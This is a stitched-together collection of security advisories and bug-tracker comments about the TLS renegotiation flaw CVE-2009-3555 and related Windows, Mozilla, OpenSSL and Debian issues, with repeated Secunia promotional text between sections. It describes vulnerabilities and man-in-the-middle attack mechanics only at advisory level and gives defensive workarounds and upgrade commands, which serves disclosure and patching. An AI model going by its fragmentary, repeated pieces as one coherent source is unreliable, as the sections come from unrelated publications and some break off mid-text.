**Recommendation.** The majority of customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update immediately using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

**Known Issues.** None

## TLS/SSL Renegotiation Vulnerability - CVE-2009-3555

A spoofing vulnerability exists in the TLS/SSL protocol, implemented in the Microsoft Windows SChannel authentication component. An attacker who successfully exploited this vulnerability would be able to introduce information on a TLS/SSL protected connection, effectively sending traffic spoofing the authenticated client. This security addresses a vulnerability previously discussed in [Microsoft Security Advisory 977377](https://technet.microsoft.com/security/advisory/977377).

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2009-3555](https://www.cve.org/CVERecord?id=CVE-2009-3555).

#### Mitigating Factors for TLS/SSL Renegotiation Vulnerability - CVE-2009-3555

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* Web sites that do not host content via SSL, but only serve content via HTTP (clear text) connections are not affected.
* Internet Information Services (IIS) 6 and IIS 7 do not allow client-initiated renegotiation. This reduces the attack surface considerably. SSL sites where a user types in username and password are unlikely to be vulnerable. The most likely scenario that would allow spoofing with IIS 6 and IIS 7 is when client-side certificates are used to perform mutual authentication. This scenario is not common.
* Customers are only affected when an attacker is able to successfully conduct a man-in-the-middle attack by exploiting another vulnerability, such as a local subnet attack or DNS spoofing.

#### Workarounds for TLS/SSL Renegotiation Vulnerability - CVE-2009-3555

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Enable SSLAlwaysNegoClientCert on IIS 6 and above**

  Web servers running IIS 6 and later that are affected because they require mutual authentication by requesting a client certificate can be hardened by enabling the SSLAlwaysNegoClientCert setting. This will cause IIS to prompt the client for a certificate upon the initial connection, and does not require a server-initiated renegotiation.

  **Impact of Workaround:** Setting this flag will require the client to authenticate prior to loading any element from the SSL-protected web site. This will cause the browser to always prompt the user for a client certificate upon connecting to the SSL protected web site. If mutual authentication is *not* required for the SSL protected content, users who are prompted to select a certificate can simply dismiss the dialog box to view the content over the SSL connection without having to select a client certificate to authenticate with.

  **For IIS 6:**

  Run the following command from the "c:\inetpub\adminscripts" folder in an elevated / administrator command prompt:

  `adsutil.vbs SET w3svc/<n>/SSLAlwaysNegoClientCert true`

  Where <N> represents the number of the web site to be configured (i.e. the 'Default Web Site' is 1, the next web site is 2, etc.). So for example - to protect the 'Default Web Site' created by IIS the following command would be used:

  `adsutil.vbs SET w3svc/1/SSLAlwaysNegoClientCert true`

  **For IIS 7:**

  Save the following text to a file called "Enable\_SSL\_Renegotiate\_Workaround.js"

  ```
  var vdirObj=GetObject("IIS://localhost/W3svc/1");
  // replace 1 on this line with the number of the web site you wish to configure

  WScript.Echo("Value of SSLAlwaysNegoClientCert Before: " + vdirObj.SSLAlwaysNegoClientCert);
  vdirObj.Put("SSLAlwaysNegoClientCert", true);
  vdirObj.SetInfo();
  WScript.Echo("Value of SSLAlwaysNegoClientCert After: " + vdirObj.SSLAlwaysNegoClientCert);

  ```

  Run the following command from an elevated / administrator command prompt:

  `cscript.exe enable_ssl_renegotiate_workaround.js`

#### FAQ for TLS/SSL Renegotiation Vulnerability - CVE-2009-3555

**What is the scope of the vulnerability?**

This vulnerability is a spoofing vulnerability. An attacker who successfully exploited this vulnerability would be able to introduce information on a TLS/SSL protected connection, effectively sending traffic spoofing the authenticated client.

**What causes the vulnerability?**

The TLS protocol, described in RFC 2246, describes the functionality of renegotiation, which allows either peer to renegotiate the parameters of a protected connection at any point in time. An attacker who is able to leverage another attack, such as DNS spoofing or a local subnet attack, to become a man-in-the-middle on such a connection, could abuse such renegotiation functionality in order to prepend application-specific commands to a valid TLS session being set up.

In specific scenarios, the server may execute those commands in the context of the TLS/SSL authenticated client. In Windows, TLS and SSL are implemented by the Secure Channel (SChannel) security package.

**Why is a default installation of IIS 6.0 and above not affected by this vulnerability?**

This vulnerability can only be exploited when either peer of the connection is allowed to renegotiate TLS/SSL parameters. IIS prevents any client-initiated TLS/SSL renegotiation. In addition, IIS will only initiate a server-side renegotiation attempt when configured to use certificate based mutual authentication, which is a non-default setting.

Note that in deployments where the actual TLS/SSL connection is not terminated on the IIS server directly, but on a third-party SSL terminator or reverse proxy, the connection may still be susceptible to this vulnerability.

**What is a man-in-the-middle attack?**

A man-in-the-middle attack occurs when an attacker reroutes communication between two users through the attackerâs computer without the knowledge of the two communicating users. Each user in the communication unknowingly sends traffic to and receives traffic from the attacker, all the while thinking they are communicating only with the intended user. In the case of this vulnerability, the man-in-the-middle cannot read, decrypt or alter the encrypted communication between the client and the server. The man-in-the-middle is only able to introduce a request into the TLS session that gets executed in the context of the client.

**What is mutual authentication?**

Mutual authentication is a security feature in which a client process must prove its identity to a server, and the server must prove its identity to the client, before any application traffic is sent over the client-to-server connection.

Mutual authentication requires that the client and server prove their respective identities to each other before performing any application functions. Identity can be proved through cryptographic means, as with a public key infrastructure and digital certificates.

**What is TLS?**

The Transport Layer Security (TLS) Handshake Protocol is responsible for the authentication and key exchange necessary to establish or resume secure sessions. When establishing a secure session, the Handshake Protocol manages the following:

Cipher suite negotiation

Authentication of the server and optionally, the client

Session key information exchange

For more information, see the TechNet article, [How TLS/SSL works](https://technet.microsoft.com/library/cc783349%28ws.10%29.aspx).

**What is SSL?**

SSL is a predecessor of the Transport Layer Security protocol. It performs the same functions and supports secure network communications using a combination of public and secret key technology.

For more information, see the TechNet article, [How TLS/SSL works](https://technet.microsoft.com/library/cc783349%28ws.10%29.aspx).

**What is TLS/SSL renegotiation?**

Renegotiation is a feature of the TLS and SSL protocols that allows either peer to renegotiate parameters specific to the cryptographic connection, such as encryption keys.

**What is the SChannel security package?**

The Secure Channel (SChannel) security package is a Security Support Provider (SSP) that implements the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) Internet standard authentication protocols. These components are used to implement secure communications in support of several common internet and network applications, such as web browsing. SChannel is part of the security package that helps provide an authentication service to provide secure communications between client and server.

For more information, see the MSDN article, [Secure Channel](https://msdn.microsoft.com/library/aa380123%28vs.85%29.aspx).

**What might an attacker use the vulnerability to do?**

In vulnerable deployments, an attacker could use this vulnerability to prepend content into a legitimate, client-initiated request to a server in the context of a valid TLS/SSL-authenticated session. This vulnerability does not allow the attacker to read, decrypt, or alter encrypted traffic between client and server.

**How could an attacker exploit the vulnerability?**

An attacker could exploit this vulnerability by setting up a man-in-the-middle attack between a client and server, subsequently interrupting their connection as soon as an SSL renegotiation attempt takes place. At this point in time, the attacker can introduce a limited set of data onto the protected path, which the server will then interpret as originating from its trusted client.

**What systems are primarily at risk from the vulnerability?**

This vulnerability mainly affects clients used for web browsers, and the corresponding web servers, though some versions of this attack may affect other TLS/SSL protected protocols.

**What does the update do?**

The update addresses this vulnerability by implementing RFC 5746. This RFC introduces a TLS extension which cryptographically ties TLS renegotiations to the original TLS connection onto which they are performed. This allows authentication to be carried forward and later validated, and prevents the attack.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2009-3555](https://www.cve.org/CVERecord?id=CVE-2009-3555).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers when this security bulletin was originally issued.

## SChannel Malformed Certificate Request Remote Code Execution Vulnerability - CVE-2010-2566

A remote code execution vulnerability exists in the way that SChannel on a client machine validates a certificate request message sent by the server. An attacker could host a specially crafted Web site that is designed to exploit these vulnerabilities through an Internet Web browser and then convince a user to view the Web site. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2010-2566](https://www.cve.org/CVERecord?id=CVE-2010-2566).

Microsoft has not identified any workarounds for this vulnerability.

#### FAQ for SChannel Malformed Certificate Request Remote Code Execution Vulnerability - CVE-2010-2566

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability. An attacker who successfully exploited this vulnerability could remotely take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Attempts to exploit this vulnerability will most probably result in a denial of service condition rather than remote code execution.

**What causes the vulnerability?**

This vulnerability is caused by SChannel insufficiently validating certificate request messages sent by the server.

**What is the SChannel security package?**

The Secure Channel (SChannel) security package is a Security Support Provider (SSP) that implements the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) Internet standard authentication protocols. These components are used to implement secure communications in support of several common internet and network applications, such as web browsing. SChannel is part of the security package that helps provide an authentication service to provide secure communications between client and server.

For more information, see the MSDN article, [Secure Channel](https://msdn.microsoft.com/library/aa380123%28vs.85%29.aspx).

**What is TLS?**

The Transport Layer Security (TLS) Handshake Protocol is responsible for the authentication and key exchange necessary to establish or resume secure sessions. When establishing a secure session, the Handshake Protocol manages the following:

Cipher suite negotiation

Authentication of the server and optionally, the client

Session key information exchange

For more information, see the TechNet article, [How TLS/SSL works](https://technet.microsoft.com/library/cc783349%28ws.10%29.aspx).

**What is SSL?**

SSL is a predecessor of the Transport Layer Security protocol. It performs the same functions and supports secure network communications using a combination of public and secret key technology.

For more information, see the TechNet article, [How TLS/SSL works](https://technet.microsoft.com/library/cc783349%28ws.10%29.aspx).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could theoretically take complete control of the affected system. However, attempts to exploit this vulnerability would most likely result in Denial of Service. The system would not be able to connect to Web sites or other network resources using SSL or TLS until a restart of the system.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit this vulnerability through an Internet web browser and then convince a user to view the Web site. An attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger request that takes users to the attacker's Web site.

**What systems are primarily at risk from the vulnerability?**

This vulnerability requires that a user is logged on and visits a Web site for any malicious action to occur. Therefore, any systems where an Internet Web browser or applications that use SSL or TLS is used frequently, such as workstations or terminal servers, are at the most risk from this vulnerability.

**What does the update do?**

This update implements additional validation on SSL responses returned by a server.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through coordinated vulnerability disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers when this security bulletin was originally issued.

  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.

     **Note** Depending on the edition of the operating system, or the programs that are installed on your system, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your system by comparing it to the version that is documented in the appropriate file information table.

     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Mozilla Foundation Security Advisory 2010-22

## Update NSS to support TLS renegotiation indication

Announced
March 30, 2010
Reporter
Mozilla developers and community
Impact
Low
Products
Firefox, SeaMonkey, Thunderbird
Fixed in

* Firefox 3.5.9
* Firefox 3.6.2
* SeaMonkey 2.0.4
* Thunderbird 3.0.4

### Description

Mozilla developers added support in the Network Security Services
module for preventing a type of man-in-the-middle attack against TLS
using forced renegotiation.

Note that to benefit from the fix, Firefox 3.6 and
Firefox 3.5 users will need to set
their `security.ssl.require_safe_negotiation` preference to
true. Firefox 3 does not contain the fix for this issue.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Package        : pound
CVE ID         : CVE-2009-3555 CVE-2012-4929 CVE-2014-3566
Debian Bug     : 723731 727197 765539 765649

Pound, a HTTP reverse proxy and load balancer, had several issues
related to vulnerabilities in the Secure Sockets Layer (SSL) protocol.

For Debian 7 (wheezy) this update adds a missing part to make it
actually possible to disable client-initiated renegotiation and
disables it by default (CVE-2009-3555). TLS compression is disabled
(CVE-2012-4929), although this is normally already disabled by the OpenSSL
system library. Finally it adds the ability to disable the SSLv3 protocol
(CVE-2014-3566) entirely via the new "DisableSSLv3" configuration
directive, although it will not disabled by default in this update.
Additionally a non-security sensitive issue in redirect encoding is
addressed.

For Debian 8 (jessie) these issues have been fixed prior to the release,
with the exception of client-initiated renegotiation (CVE-2009-3555).
This update addresses that issue for jessie.

For the oldstable distribution (wheezy), these problems have been fixed
in version 2.6-2+deb7u1.

For the stable distribution (jessie), these problems have been fixed in
version 2.6-6+deb8u1.

For the unstable distribution (sid), these problems have been fixed in
version 2.6-6.1.

We recommend that you upgrade your pound packages.

The Moblin web browser engine was updated to the Firefox equivalent
version 3.5.9.
Following security issues were fixed in 3.5.9:
MFSA 2010-16: Mozilla developers identified and fixed several stability
bugs in the browser engine used in Firefox and other Mozilla-based
products. Some of these crashes showed evidence of memory corruption
under certain circumstances, and we presume that with enough effort at
least some of these could be exploited to run arbitrary code.
References
Martijn Wargers, Josh Soref, and Jesse Ruderman reported crashes in the
browser engine that affected Firefox 3.5 and Firefox 3.6. (CVE-2010-0173)
Jesse Ruderman and Ehsan Akhgari reported crashes that affected all
supported versions of the browser engine. (CVE-2010-0174)
MFSA 2010-17 / CVE-2010-0175:
Security researcher regenrecht reported via TippingPoint's Zero Day
Initiative that a select event handler for XUL tree items could be called
after the tree item was deleted. This results in the execution of
previously freed memory which an attacker could use to crash a victim's
browser and run arbitrary code on the victim's computer.
MFSA 2010-18 / CVE-2010-0176: Security researcher regenrecht reported via
TippingPoint's Zero Day Initiative an error in the way elements are
inserted into a XUL tree optgroup. In certain cases, the number of
references to an element is under-counted so that when the element is
deleted, a live pointer to its old location is kept around and may later
be used. An attacker could potentially use these conditions to run
arbitrary code on a victim's computer.
MFSA 2010-19 / CVE-2010-0177: Security researcher regenrecht reported via
TippingPoint's Zero Day Initiative an error in the implementation of the
window.navigator.plugins object. When a page reloads, the plugins array
would reallocate all of its members without checking for existing
references to each member. This could result in the deletion of objects
for which valid pointers still exist. An attacker could use this
vulnerability to crash a victim's browser and run arbitrary code on the
victim's machine.
MFSA 2010-20 / CVE-2010-0178: Security researcher Paul Stone reported
that a browser applet could be used to turn a simple mouse click into a
drag-and-drop action, potentially resulting in the unintended loading of
resources in a user's browser. This behavior could be used twice in
succession to first load a privileged chrome: URL in a victim's browser,
then load a malicious javascript: URL on top of the same document
resulting in arbitrary script execution with chrome privileges.
MFSA 2010-21 / CVE-2010-0179: Mozilla security researcher moz\_bug\_r\_a4
reported that the XMLHttpRequestSpy module in the Firebug add-on was
exposing an underlying chrome privilege escalation vulnerability. When
the XMLHttpRequestSpy object was created, it would attach various
properties of itself to objects defined in web content, which were not
being properly wrapped to prevent their exposure to chrome privileged
objects. This could result in an attacker running arbitrary JavaScript
on a victim's machine, though it required the victim to have Firebug
installed, so the overall severity of the issue was determined to be
High.
MFSA 2010-22 / CVE-2009-3555: Mozilla developers added support in the
Network Security Services module for preventing a type of
man-in-the-middle attack against TLS using forced renegotiation.
Note that to benefit from the fix, Firefox 3.6 and Firefox 3.5 users
will need to set their security.ssl.require\_safe\_negotiation preference
to true. Firefox 3 does not contain the fix for this issue.
MFSA 2010-23 / CVE-2010-0181: phpBB developer Henry Sudhof reported that

- seamonkey
This update brings Mozilla Seamonkey to 1.1.19 fixing various bugs and
security issues.
Following security issues are fixed:
MFSA 2010-07:
Mozilla developers took fixes from previously fixed memory safety bugs in
newer Mozilla-based products and ported them to the Mozilla 1.8.1 branch
so they can be utilized by Thunderbird 2 and SeaMonkey 1.1.
Paul Fisher reported a crash when joined to an Active Directory server
under Vista or Windows 7 and using SSPI authentication.
(CVE-2010-0161)
Ludovic Hirlimann reported a crash indexing some messages with
attachments
(CVE-2010-0163)
Carsten Book reported a crash in the JavaScript engine
(CVE-2009-3075)
Josh Soref reported a crash in the BinHex decoder used on non-Mac
platforms.
(CVE-2009-3072)
monarch2000 reported an integer overflow in a base64 decoding function
(CVE-2009-2463)
MFSA 2009-68 / CVE-2009-3983: Security researcher Takehiro Takahashi of
the IBM
X-Force reported that Mozilla's NTLM implementation was vulnerable to
reflection attacks in which NTLM credentials from one application could be
forwarded to another arbitary application via the browser. If an attacker
could get a user to visit a web page he controlled he could force NTLM
authenticated requests to be forwarded to another application on behalf
of the user.
MFSA 2009-62 / CVE-2009-3376:
Mozilla security researchers Jesse Ruderman and Sid Stamm reported that
when downloading a file containing a right-to-left override character
(RTL) in the filename, the name displayed in the dialog title bar
conflicts with the name of the file shown in the dialog body. An attacker
could use this vulnerability to obfuscate the name and file extension of
a file to be downloaded and opened, potentially causing a user to run an
executable file when they expected to open a non-executable file.
MFSA 2009-59 / CVE-2009-0689:
Security researcher Alin Rad Pop of Secunia Research reported a heap-based
buffer overflow in Mozilla's string to floating point number conversion
routines. Using this vulnerability an attacker could craft some malicious
JavaScript code containing a very long string to be converted to a floating
point number which would result in improper memory allocation and the
execution of an arbitrary memory location. This vulnerability could thus
be leveraged by the attacker to run arbitrary code on a victim's computer.
Update: The underlying flaw in the dtoa routines used by Mozilla appears to
be essentially the same as that reported against the libc gdtoa routine by
Maksymilian Arciemowicz.
MFSA 2010-06 / CVE-2009-3385:
Security researcher Georgi Guninski reported that scriptable plugin
content, such as Flash objects, could be loaded and executed in SeaMonkey
mail messages by embedding the content in an iframe inside the message.
If a user were to reply to or forward such a message, malicious
JavaScript embedded in the plugin content could potentially steal the
contents of the message or files from the local filesystem.
MFSA 2009-49 / CVE-2009-3077:
An anonymous security researcher, via TippingPoint's Zero Day Initiative,
reported that the columns of a XUL tree element could be manipulated in a
particular way which would leave a pointer owned by the column pointing
to freed memory. An attacker could potentially use this vulnerability to
crash a victim's browser and run arbitrary code on the victim's computer.

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.

# OpenSSL: Multiple vulnerabilities — GLSA **200912-01**

Multiple vulnerabilities in OpenSSL might allow remote attackers to conduct
multiple attacks, including the injection of arbitrary data into encrypted
byte streams.

### Affected packages

| Package | **dev-libs/openssl** on all architectures |
| --- | --- |
| Affected versions | < **0.9.8l-r2** |
| Unaffected versions | >= **0.9.8l-r2** |

### Background

OpenSSL is an Open Source toolkit implementing the Secure Sockets Layer
(SSL v2/v3) and Transport Layer Security (TLS v1) as well as a general
purpose cryptography library.

### Description

Multiple vulnerabilities have been reported in OpenSSL:

* Marsh Ray of PhoneFactor and Martin Rex of SAP independently
  reported that the TLS protocol does not properly handle session
  renegotiation requests (CVE-2009-3555).
* The MD2 hash algorithm is no longer considered to be
  cryptographically strong, as demonstrated by Dan Kaminsky. Certificates
  using this algorithm are no longer accepted (CVE-2009-2409).
* Daniel Mentz and Robin Seggelmann reported the following
  vulnerabilities related to DTLS: A use-after-free flaw (CVE-2009-1379)
  and a NULL pointer dereference (CVE-2009-1387) in the
  dtls1\_retrieve\_buffered\_fragment() function in src/d1\_both.c, multiple
  memory leaks in the dtls1\_process\_out\_of\_seq\_message() function in
  src/d1\_both.c (CVE-2009-1378), and a processing error related to a
  large amount of DTLS records with a future epoch in the
  dtls1\_buffer\_record() function in ssl/d1\_pkt.c
  (CVE-2009-1377).

### Impact

A remote unauthenticated attacker, acting as a Man in the Middle, could
inject arbitrary plain text into a TLS session, possibly leading to the
ability to send requests as if authenticated as the victim. A remote
attacker could furthermore send specially crafted DTLS packages to a
service using OpenSSL for DTLS support, possibly resulting in a Denial
of Service. Also, a remote attacker might be able to create rogue
certificates, facilitated by a MD2 collision. NOTE: The amount of
computation needed for this attack is still very large.

### Workaround

There is no known workaround at this time.

### Resolution

All OpenSSL users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-libs/openssl-0.9.8l-r2"
```

| [Description](show_bug.cgi?id=533125#c0)  Tomas Hoger    2009-11-05 08:26:58 UTC  ``` Marsh Ray of PhoneFactor has discovered a flaw in the TLS/SSL protocol related to the handling of the session rehandshakes / renegotiations.  This flaw can possibly be used in the MITM attacks and allowing an attacker to inject attacker-chosen plain text prefix to the session of the victim.  Further details are available in the "Authentication Gap in TLS Renegotiation" blog post:   <http://extendedsubset.com/?p=8>   ```  [Comment 1](show_bug.cgi?id=533125#c1)  Tomas Hoger    2009-11-05 08:43:03 UTC  ``` Independent discovery by Martin Rex:   <http://www.ietf.org/mail-archive/web/tls/current/msg03928.html>   ```  [Comment 2](show_bug.cgi?id=533125#c2)  Tomas Hoger    2009-11-05 08:49:34 UTC  ``` Ben Laurie's blog post with proposed change for OpenSSL:   <http://www.links.org/?p=780>  Note: This workaround disables all renegotiation, so it will break all uses where renegotiation is required and used.   ```  [Comment 3](show_bug.cgi?id=533125#c3)  Tomas Hoger    2009-11-05 09:06:46 UTC  ``` Proposed patches for GnuTLS from PhoneFactor:   <http://lists.gnu.org/archive/html/gnutls-devel/2009-11/msg00014.html>   ```  [Comment 4](show_bug.cgi?id=533125#c4)  Tomas Hoger    2009-11-05 12:56:41 UTC  ``` (In reply to [comment #2](show_bug.cgi?id=533125#c2)) > Ben Laurie's blog post with proposed change for OpenSSL: >   <http://www.links.org/?p=780>  Committed now in OpenSSL CVS too:   <http://cvs.openssl.org/chngview?cn=18790>  Applications shipped in Red Hat Enterprise Linux that are likely to be negatively impacted by this change:  - mod_ssl - Server-initiated renegotiations are commonly needed in setups where client certificate authentication is required for some parts of the web site, but not for the whole site, or when different cipher suites are required for different parts of the site.  - PostgreSQL - Server initiates renegotiation after certain amount of data was transferred through the connection.   ```  [Comment 5](show_bug.cgi?id=533125#c5)  Tomas Hoger    2009-11-05 20:22:33 UTC  ``` TLS Renegotiation Indication Extension proposed RFC draft:  <https://svn.resiprocate.org/rep/ietf-drafts/ekr/draft-rescorla-tls-renegotiate.txt> <https://svn.resiprocate.org/rep/ietf-drafts/ekr/draft-rescorla-tls-renegotiate.xml>  (source: <http://www.ietf.org/mail-archive/web/tls/current/msg03963.html>)   ```  [Comment 6](show_bug.cgi?id=533125#c6)  Bob Relyea    2009-11-06 00:12:04 UTC  ``` Mozilla bug for NSS is here: <https://bugzilla.mozilla.org/show_bug.cgi?id=524596>  It's security sensitive.

For MITM attacker, standard CSRF attack may be even easier to mount, as it can be done by adding malicious links or javascript to any HTTP page requested by the victim.  Proper CSRF protections should block attacks via TLS MITM.  Normal CSRF attack, however, may be easier to spot by victim where client certificates are used and each certificate use must be acknowledged by user (default configuration in e.g. firefox), as prompt for certificate use will appear in unexpected moment.   ```  [Comment 14](show_bug.cgi?id=533125#c14)  Tomas Hoger    2009-11-06 10:55:06 UTC  ``` Red Hat Knowledgebase article:   <http://kbase.redhat.com/faq/docs/DOC-20491>   ```  [Comment 15](show_bug.cgi?id=533125#c15)  Tomas Hoger    2009-11-06 15:39:56 UTC  ``` (In reply to [comment #10](show_bug.cgi?id=533125#c10)) > Created an attachment (id=367773) [details] > NSS patch to turn off renegotiation  Reading the patch and upstream bug report, this allows enabling or disabling renegotiation and making a space for adding the "handle reneg extension" when RFC / implementation is ready.  Will that allow servers to tell NSS to ignore all server-initiated renegs completely?  I'm also marking that attachment obsolete, upstream bug has updated version of it already.   ```  [Comment 16](show_bug.cgi?id=533125#c16)  Bob Relyea    2009-11-06 18:11:33 UTC  ``` The current patch either turns off all renegotiation, or turns on all renegotioation. There is currently no way to turn off just client initiated renegotiation, and I don't expect one from upstream anytime soon.  The 'space' is for implementing the tls reneg extension draft. So as the end result would be the following options:  no renegotiation -- ever. (client or server) renegotiate only if the extension is in use. allow any type of renegotiation.  It's probably reasonable to add an option that says 'no client renegotiation'.   All on or all off would help most customers immediately, so it seems reasonable to get those out to them.  bob   ```  [Comment 20](show_bug.cgi?id=533125#c20)  Rick Andrews    2009-11-10 23:31:54 UTC  ``` Turning off all renegotiation means that SGC step-up will not happen. There are a lot of SGC certs out there, and browsers that can perform step-up. I hope that a better patch gets developed that allows renegotiation but cryptographically ties together the two sessions.  -Rick Andrews   ```  [Comment 21](show_bug.cgi?id=533125#c21)  Bob Relyea    2009-11-10 23:54:07 UTC  ``` There are very few browsers out there that need to do SGC step-up anymore. Browser companies have been shipping full strength clients since 2001. Step-up requires client initiated renegotiation, which has been turned of in IIS for a while now.  There are plans to re-enable renegotiation with an extension being discussed in the tls working group, and patches are being worked on, but its extremely unlikely that anyone with a browser that is so old that it needs to do ssl step-up will be able to get a patch that fixes that browser to do a safe renegotiation.   ```  [Comment 22](show_bug.cgi?id=533125#c22)  Rick Andrews    2009-11-11 00:37:09 UTC  ``` Bob,  I understand that if the fix requires changes to both browser and web server, then it's unlikely that very old browsers will get patched. But if a fix can be done on the server without browser changes, then I would hope that it would be done in such a way as to allow old browsers to continue to work (unlike the current approach of simply turning off renegotiation).  -Rick   ```  [Comment 23](show_bug.cgi?id=533125#c23)  Tomas Hoger    2009-11-11 09:17:06 UTC  ``` A mitigation patch was created for mod_ssl, which rejects all client-initiated renegotiation requests:  <http://marc.info/?l=apache-httpd-announce&m=125755783724966&w=2> <http://svn.apache.org/viewvc?view=revision&revision=833622> 